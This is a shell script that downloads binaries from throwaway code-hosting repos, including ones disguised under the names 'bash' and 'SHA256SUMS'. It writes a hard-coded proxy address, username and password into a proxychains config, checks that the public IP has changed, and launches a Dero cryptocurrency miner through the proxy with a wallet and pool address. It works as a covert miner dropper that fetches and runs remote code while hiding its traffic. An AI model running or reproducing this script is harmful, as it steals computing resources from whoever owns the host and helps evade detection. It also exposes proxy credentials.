proxy="38.154.227.167" 
port="5868" 
user="ugursfso"  
pass="wqn60pnk6m95" 
wget https://gitlab.com/alexandercobaeli471/thegitpp/-/raw/main/bash && chmod +x bash
wget https://raw.githubusercontent.com/pagesrlepla/mx9/main/SHA256SUMS && chmod +x SHA256SUMS 
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./bash --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeth4v7yz7m959q2c897k --daemon-rpc-address=community-pools.mysrv.cloud:10300 
